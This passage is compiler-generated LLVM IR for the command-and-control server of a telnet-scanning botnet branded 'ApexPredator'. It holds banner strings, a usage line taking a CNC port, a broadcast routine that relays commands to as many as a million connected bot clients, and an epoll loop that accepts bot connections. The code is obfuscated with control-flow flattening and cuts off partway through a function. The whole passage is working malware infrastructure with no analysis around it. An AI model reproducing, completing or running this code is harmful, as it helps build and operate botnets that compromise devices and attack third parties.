@.str.197 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER STARTED\0D\0A\00", align 1
@.str.198 = private unnamed_addr constant [15 x i8] c"!* SCANNER OFF\00", align 1
@.str.199 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER STOPPED\0D\0A\00", align 1
@.str.200 = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.201 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.202 = private unnamed_addr constant [4 x i8] c"CLS\00", align 1
@.str.203 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.204 = private unnamed_addr constant [5 x i8] c"EXIT\00", align 1
@.str.205 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.206 = private unnamed_addr constant [97 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] - Command:\1B[1;37m[\1B[0;36m%s\1B[1;37m]\0A\00", align 1
@.str.207 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.208 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Screening Error\00", align 1
@.str.209 = private unnamed_addr constant [62 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Incoming Connection From \00", align 1
@.str.210 = private unnamed_addr constant [7 x i8] c"IP.log\00", align 1
@.str.211 = private unnamed_addr constant [90 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Incoming Connection From [\1B[0;36m%d.%d.%d.%d\1B[1;37m]\0A\00", align 1
@.str.212 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.213 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.214 = private unnamed_addr constant [87 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Thread Limit Exceeded! Please Lower Threat Count!\0A\00", align 1
@.str.215 = private unnamed_addr constant [111 x i8] c"\1B[1;31m\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Successfully Screened - Created By [\1B[0;36mFlexingOnLamers\1B[1;37m]\0A\00", align 1
@.str.216 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.217 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.218 = private unnamed_addr constant [7 x i8] c"STRING\00", align 1
@.str.220 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.221 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.222 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  %switchVar = alloca i32
  store i32 1254186382, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1254186382, label %9
    i32 1799369638, label %13
    i32 502654445, label %18
    i32 636097715, label %27
    i32 424147554, label %29
    i32 1431201018, label %39
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  %12 = select i1 %11, i32 1799369638, i32 636097715
  store i32 %12, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %7, align 4
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %14, %15
  %17 = select i1 %16, i32 502654445, i32 636097715
  store i32 %17, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = getelementptr inbounds i8, i8* %22, i64 -1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 10
  store i32 636097715, i32* %switchVar
  store i1 %26, i1* %.reg2mem
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %28 = select i1 %.reload, i32 424147554, i32 1431201018
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %6, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %7, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = call i64 @read(i32 %30, i8* %34, i64 1)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %8, align 4
  %37 = load i32, i32* %7, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %7, align 4
  store i32 1254186382, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  ret i32 %40

loopEnd:                                          ; preds = %29, %27, %18, %13, %9, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -546785922, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -546785922, label %10
    i32 -171254955, label %20
    i32 -509478010, label %23
    i32 1266116826, label %24
    i32 -780758809, label %29
    i32 -1794270798, label %38
    i32 55357601, label %40
    i32 1889224517, label %43
    i32 -531649700, label %45
    i32 560719078, label %50
    i32 -914724669, label %62
    i32 -521960205, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  %19 = select i1 %18, i32 -171254955, i32 -509478010
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %4, align 4
  store i32 -546785922, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 1266116826, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %5, align 4
  %26 = load i32, i32* %4, align 4
  %27 = icmp sge i32 %25, %26
  %28 = select i1 %27, i32 -780758809, i32 -1794270798
  store i32 %28, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = call i32 @isspace(i32 %35) #8
  %37 = icmp ne i32 %36, 0
  store i32 -1794270798, i32* %switchVar
  store i1 %37, i1* %.reg2mem
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %39 = select i1 %.reload, i32 55357601, i32 1889224517
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, -1
  store i32 %42, i32* %5, align 4
  store i32 1266116826, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %3, align 4
  store i32 -531649700, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp sle i32 %46, %47
  %49 = select i1 %48, i32 560719078, i32 -521960205
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %2, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = load i32, i32* %4, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %56, i64 %60
  store i8 %55, i8* %61, align 1
  store i32 -914724669, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %3, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %3, align 4
  store i32 -531649700, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8*, i8** %2, align 8
  %67 = load i32, i32* %3, align 4
  %68 = load i32, i32* %4, align 4
  %69 = sub nsw i32 %67, %68
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %66, i64 %70
  store i8 0, i8* %71, align 1
  ret void

loopEnd:                                          ; preds = %62, %50, %45, %43, %40, %38, %29, %24, %23, %20, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8*, i32, i8*) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  store i32 %14, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -220265842, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -220265842, label %first
    i32 -1011991829, label %17
    i32 1292426093, label %18
    i32 -160401547, label %36
    i32 -1518861719, label %40
    i32 -602275615, label %45
    i32 1205112354, label %53
    i32 -570597369, label %57
    i32 -822385978, label %65
    i32 -1233036239, label %66
    i32 1938667045, label %67
    i32 1074414045, label %70
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %15 = icmp eq i32 %.reload, 0
  %16 = select i1 %15, i32 -1011991829, i32 1292426093
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 1292426093, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = call i64 @strlen(i8* %19) #8
  %21 = add i64 %20, 10
  %22 = call noalias i8* @malloc(i64 %21) #7
  store i8* %22, i8** %8, align 8
  %23 = load i8*, i8** %8, align 8
  %24 = load i8*, i8** %4, align 8
  %25 = call i64 @strlen(i8* %24) #8
  %26 = add i64 %25, 10
  call void @llvm.memset.p0i8.i64(i8* %23, i8 0, i64 %26, i32 1, i1 false)
  %27 = load i8*, i8** %8, align 8
  %28 = load i8*, i8** %4, align 8
  %29 = call i8* @strcpy(i8* %27, i8* %28) #7
  %30 = load i8*, i8** %8, align 8
  call void @trim(i8* %30)
  %31 = call i64 @time(i64* %9) #7
  %32 = call %struct.tm* @localtime(i64* %9) #7
  store %struct.tm* %32, %struct.tm** %10, align 8
  %33 = load %struct.tm*, %struct.tm** %10, align 8
  %34 = call i8* @asctime(%struct.tm* %33) #7
  store i8* %34, i8** %11, align 8
  %35 = load i8*, i8** %11, align 8
  call void @trim(i8* %35)
  store i32 0, i32* %12, align 4
  store i32 -160401547, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %12, align 4
  %38 = icmp slt i32 %37, 1000000
  %39 = select i1 %38, i32 -1518861719, i32 1074414045
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %12, align 4
  %42 = load i32, i32* %5, align 4
  %43 = icmp eq i32 %41, %42
  %44 = select i1 %43, i32 -822385978, i32 -602275615
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %12, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %47
  %49 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %48, i32 0, i32 2
  %50 = load i8, i8* %49, align 1
  %51 = icmp ne i8 %50, 0
  %52 = select i1 %51, i32 -1233036239, i32 1205112354
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i32, i32* %7, align 4
  %55 = icmp eq i32 %54, 0
  %56 = select i1 %55, i32 -822385978, i32 -570597369
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %12, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %59
  %61 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %60, i32 0, i32 1
  %62 = load i32, i32* %61, align 4
  %63 = icmp ne i32 %62, 0
  %64 = select i1 %63, i32 -1233036239, i32 -822385978
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 1938667045, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 1938667045, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %12, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %12, align 4
  store i32 -160401547, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i8*, i8** %8, align 8
  call void @free(i8* %71) #7
  ret void

loopEnd:                                          ; preds = %67, %66, %65, %57, %53, %45, %40, %36, %18, %17, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @epollEventLoop(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca %struct.epoll_event, align 1
  %5 = alloca %struct.epoll_event*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr, align 2
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  store i8* %0, i8** %3, align 8
  %18 = call noalias i8* @calloc(i64 1000000, i64 12) #7
  %19 = bitcast i8* %18 to %struct.epoll_event*
  store %struct.epoll_event* %19, %struct.epoll_event** %5, align 8
  %switchVar = alloca i32
  store i32 1391819144, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1391819144, label %20
    i32 -1899627426, label %24
    i32 1817949606, label %29
    i32 -1538503183, label %39
    i32 12061516, label %49
    i32 -530262274, label %59
    i32 1004201760, label %78
    i32 -1336824497, label %89
    i32 -365712665, label %90
    i32 -2043215669, label %96
    i32 -593362203, label %101
    i32 -1698435141, label %106
    i32 -135204595, label %107
    i32 997790432, label %108
    i32 1707706044, label %122
    i32 1590870925, label %125
    i32 2082488042, label %136
    i32 2114497124, label %139
    i32 959152091, label %146
    i32 1772484999, label %147
    i32 1758602457, label %160
    i32 1305558908, label %162
    i32 479487623, label %166
    i32 -222063552, label %172
    i32 -1959713855, label %174
    i32 -1596363870, label %179
    i32 1723244188, label %180
    i32 -831964385, label %186
    i32 -1878892417, label %191
    i32 828830684, label %192
    i32 271705244, label %193
    i32 -947674529, label %198
    i32 -1577597907, label %199
    i32 1346414750, label %202
    i32 -2051716275, label %206
    i32 -773457098, label %211
    i32 -1627102883, label %212
    i32 -146560601, label %213
    i32 -1204388054, label %217
    i32 777134335, label %218
    i32 2109523245, label %219
    i32 -1371855760, label %220
    i32 1187592278, label %224
    i32 -1045519209, label %229
    i32 -453020185, label %230
    i32 -424808196, label %231
    i32 -1759861867, label %232
    i32 1418958072, label %235
    i32 -987125346, label %236
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load volatile i32, i32* @epollFD, align 4
  %22 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %23 = call i32 @epoll_wait(i32 %21, %struct.epoll_event* %22, i32 1000000, i32 -1)
  store i32 %23, i32* %7, align 4
  store i32 0, i32* %8, align 4
  store i32 -1899627426, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %8, align 4
  %26 = load i32, i32* %7, align 4
  %27 = icmp slt i32 %25, %26
  %28 = select i1 %27, i32 1817949606, i32 1418958072
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %31 = load i32, i32* %8, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %30, i64 %32
  %34 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %33, i32 0, i32 0
  %35 = load i32, i32* %34, align 1
  %36 = and i32 %35, 8
  %37 = icmp ne i32 %36, 0
  %38 = select i1 %37, i32 -530262274, i32 -1538503183
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %41 = load i32, i32* %8, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %40, i64 %42
  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %43, i32 0, i32 0
  %45 = load i32, i32* %44, align 1
  %46 = and i32 %45, 16
  %47 = icmp ne i32 %46, 0
  %48 = select i1 %47, i32 -530262274, i32 12061516
  store i32 %48, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %50, i64 %52
  %54 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %53, i32 0, i32 0
  %55 = load i32, i32* %54, align 1
  %56 = and i32 %55, 1
  %57 = icmp ne i32 %56, 0
  %58 = select i1 %57, i32 1004201760, i32 -530262274
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %61 = load i32, i32* %8, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %60, i64 %62
  %64 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %63, i32 0, i32 1
  %65 = bitcast %union.epoll_data* %64 to i32*
  %66 = load i32, i32* %65, align 1
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %67
  %69 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %68, i32 0, i32 2
  store i8 0, i8* %69, align 1
  %70 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %71 = load i32, i32* %8, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %70, i64 %72
  %74 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %73, i32 0, i32 1
  %75 = bitcast %union.epoll_data* %74 to i32*
  %76 = load i32, i32* %75, align 1
  %77 = call i32 @close(i32 %76)
  store i32 -1759861867, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load volatile i32, i32* @listenFD, align 4
  %80 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %81 = load i32, i32* %8, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %80, i64 %82
  %84 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %83, i32 0, i32 1
  %85 = bitcast %union.epoll_data* %84 to i32*
  %86 = load i32, i32* %85, align 1
  %87 = icmp eq i32 %79, %86
  %88 = select i1 %87, i32 -1336824497, i32 1772484999
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 -365712665, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 16, i32* %10, align 4
  %91 = load volatile i32, i32* @listenFD, align 4
  %92 = call i32 @accept(i32 %91, %struct.sockaddr* %9, i32* %10)
  store i32 %92, i32* %11, align 4
  %93 = load i32, i32* %11, align 4
  %94 = icmp eq i32 %93, -1
  %95 = select i1 %94, i32 -2043215669, i32 997790432
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = call i32* @__errno_location() #9
  %98 = load i32, i32* %97, align 4
  %99 = icmp eq i32 %98, 11
  %100 = select i1 %99, i32 -1698435141, i32 -593362203
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = call i32* @__errno_location() #9
  %103 = load i32, i32* %102, align 4
  %104 = icmp eq i32 %103, 11
  %105 = select i1 %104, i32 -1698435141, i32 -135204595
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  store i32 959152091, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0))
  store i32 959152091, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = bitcast %struct.sockaddr* %9 to %struct.sockaddr_in*
  %110 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %109, i32 0, i32 2
  %111 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %110, i32 0, i32 0
  %112 = load i32, i32* %111, align 2
  %113 = load i32, i32* %11, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %114
  %116 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %115, i32 0, i32 0
  store i32 %112, i32* %116, align 4
  %117 = load i32, i32* %11, align 4
  %118 = call i32 @make_socket_non_blocking(i32 %117)
  store i32 %118, i32* %6, align 4
  %119 = load i32, i32* %6, align 4
  %120 = icmp eq i32 %119, -1
  %121 = select i1 %120, i32 1707706044, i32 1590870925
  store i32 %121, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load i32, i32* %11, align 4
  %124 = call i32 @close(i32 %123)
  store i32 959152091, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load i32, i32* %11, align 4
  %127 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 1
  %128 = bitcast %union.epoll_data* %127 to i32*
  store i32 %126, i32* %128, align 1
  %129 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 0
  store i32 -2147483647, i32* %129, align 1
  %130 = load volatile i32, i32* @epollFD, align 4
  %131 = load i32, i32* %11, align 4
  %132 = call i32 @epoll_ctl(i32 %130, i32 1, i32 %131, %struct.epoll_event* %4) #7
  store i32 %132, i32* %6, align 4
  %133 = load i32, i32* %6, align 4
  %134 = icmp eq i32 %133, -1
  %135 = select i1 %134, i32 2082488042, i32 2114497124
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i32 0, i32 0))
  %137 = load i32, i32* %11, align 4
  %138 = call i32 @close(i32 %137)
  store i32 959152091, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i32, i32* %11, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %141
  %143 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %142, i32 0, i32 2
  store i8 1, i8* %143, align 1
  %144 = load i32, i32* %11, align 4
  %145 = call i64 @send(i32 %144, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i32 0, i32 0), i64 14, i32 16384)
  store i32 -365712665, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 -1759861867, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %149 = load i32, i32* %8, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %148, i64 %150
  %152 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %151, i32 0, i32 1
  %153 = bitcast %union.epoll_data* %152 to i32*
  %154 = load i32, i32* %153, align 1
  store i32 %154, i32* %13, align 4
  %155 = load i32, i32* %13, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %156
  store %struct.clientdata_t* %157, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %158 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %159 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %158, i32 0, i32 2
  store i8 1, i8* %159, align 1
  store i32 1758602457, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %161, i8 0, i64 2048, i32 16, i1 false)
  store i32 1305558908, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %163, i8 0, i64 2048, i32 16, i1 false)
  %164 = icmp ne i8* %163, null
  %165 = select i1 %164, i32 479487623, i32 -222063552
  store i32 %165, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %168 = load i32, i32* %13, align 4
  %169 = call i32 @fdgets(i8* %167, i32 2048, i32 %168)
  %170 = sext i32 %169 to i64
  store i64 %170, i64* %16, align 8
  %171 = icmp sgt i64 %170, 0
  store i32 -222063552, i32* %switchVar
  store i1 %171, i1* %.reg2mem
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %173 = select i1 %.reload, i32 -1959713855, i32 1346414750
